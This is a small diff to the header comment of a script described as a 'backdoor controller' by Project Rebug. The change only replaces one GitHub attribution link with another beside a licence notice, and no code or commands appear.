@@ -15,7 +15,7 @@ Backdoor controller created by Project Rebug. The code for this script
 has been made organised for better understanding.
 ---------------------------------------------------------
 // Coded By ProjectRebug Login Release Source
-// https://github.com/Void09/Login-Release
+// https://github.com/ProjectRebug/RebugV2-Release
 // Note to the person using this, removing this
 // text is in violation of the licence you agreed
 // to by downloading.
